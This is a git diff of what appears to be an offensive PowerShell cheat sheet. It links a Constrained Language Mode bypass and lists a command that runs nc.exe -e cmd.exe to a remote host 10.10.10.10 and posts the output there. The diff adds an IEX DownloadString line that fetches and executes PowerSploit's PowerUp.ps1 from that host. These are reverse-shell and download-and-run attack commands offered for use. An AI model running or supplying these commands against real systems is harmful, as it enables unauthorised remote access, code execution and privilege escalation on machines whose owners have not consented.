@@ -14,8 +14,6 @@
 Bypass of CLM : https://github.com/padovah4ck/PSByPassCLM
 
 
-
-
 ## Data exfiltration :
 
 ```
@@ -40,4 +38,8 @@ Invoke-Command -Credential $cred -ComputerName . -ScriptBlock {Invoke-WebRequest
 Invoke-Command -Credential $cred -ComputerName . -ScriptBlock {Invoke-WebRequest -Method POST -Body (c:\users\user\nc.exe -e cmd.exe 10.10.10.10 443 2>&1 | Out-String) -Uri http://10.10.10.10:4444}
 ```
 
+## Load on the fly 
 
+```
+IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/PowerSploit/Privesc/PowerUp.ps1')
+```
